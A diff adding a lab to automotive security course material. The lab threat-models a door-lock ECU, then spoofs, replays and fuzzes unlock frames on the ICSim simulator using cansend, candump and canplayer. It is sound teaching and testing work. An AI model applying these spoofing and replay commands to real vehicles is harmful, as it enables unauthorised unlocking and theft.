@@ -207,3 +207,95 @@ Points to understand
   - Message authentication (signed/MAC'd frames).
   - Freshness (rolling counters/timestamps so old frames are rejected)  
 </pre>
+
+## Lab - Threat model
+<pre>
+Objective
+- threat-model one ECU function (the door-lock), derive three concrete test cases, 
+  then execute each against the simulated CAN bus and observe the result. 
+ 
+- Prerequisites
+  - can-utils installed, vcan0 up, ICSim built.
+  - Bring up the bus and the simulated car:
+</pre>
+
+```
+sudo modprobe vcan
+sudo ip link add dev vcan0 type vcan 2>/dev/null
+sudo ip link set vcan0 up
+cd ~/ICSim
+./icsim vcan0 &
+./controls vcan0 &     # click to focus; used to generate legitimate traffic
+```
+
+The threat model
+<pre>
+- Asset: what are we protecting?
+- The lock/unlock state of the doors (physical security of the vehicle)
+- Interfaces / attack surface: how can it be reached?
+- The CAN bus (no authentication)
+- The diagnostic port (OBD-II)
+- Any wireless gateway that bridges to CAN
+- Threats (use STRIDE as a prompt):
+- Spoofing: an attacker forges an "unlock" command frame
+- Tampering: an attacker alters a legitimate frame's data
+- Replay: an attacker records a real unlock and replays it later
+- Denial of service: flooding the bus so real lock commands are lost
+- AN assumes any frame on the bus is legitimate (no sender authentication)
+- The lock ECU trusts the CAN ID + data, nothing else  
+</pre>
+
+<pre>
+Find the door-lock CAN ID, in the controls window, operate the door lock/unlock. 
+Watch cansniffer, the CAN ID whose bytes change when you lock/unlock is the door-lock message. 
+Note that ID and the data values for "lock" vs "unlock."
+</pre>
+```
+cansniffer vcan0  
+```
+
+Execute the three test cases
+
+Test case 1: spoofed unlock frame (Spoofing)
+Threat: an attacker forges an unlock command without authorization.
+Execute: inject the unlock frame you found in recon, without touching the controls:
+```
+cansend vcan0 <DOOR_ID>#<UNLOCK_DATA>
+# example (use YOUR recon values):
+cansend vcan0 19B#000000000004
+```
+
+Observe: the ICSim dashboard shows the doors unlock, from a forged frame.
+Result to record: "Spoofed unlock succeeded, the ECU accepted a forged command."
+
+Test case 2: replayed frame (Replay)
+Threat: an attacker records a legitimate unlock and replays it later.
+Execute: capture a real unlock (operate the control), then replay it:
+```
+candump -l vcan0
+# in controls: unlock the doors, then Ctrl+C
+ls -l candump-*.log
+# lock the doors again via controls (reset)
+canplayer -I candump-*.log      # replay the recorded unlock
+```
+
+Observe: the doors unlock again from the replay, no live command needed.
+Result to record: "Replay succeeded, recorded commands work later; no freshness/anti-replay."
+
+Test case 3: out-of-range / malformed value (Tampering / robustness)
+<pre>
+Threat: an attacker sends invalid data to probe the ECU's handling.
+Execute: send the door ID with deliberately invalid/out-of-range data:  
+</pre>
+
+```
+cansend vcan0 <DOOR_ID>#FFFFFFFFFFFFFFFF   # all-ones, out of spec
+cansend vcan0 <DOOR_ID>#00                  # too short / unexpected
+```
+
+<pre>
+Observe: how does the cluster react? Does it ignore it, glitch, or behave unexpectedly? Record the behavior.
+Result to record: "Out-of-range value caused [observed behavior], indicates the ECU does/doesn't validate input."
+</pre>
+
+
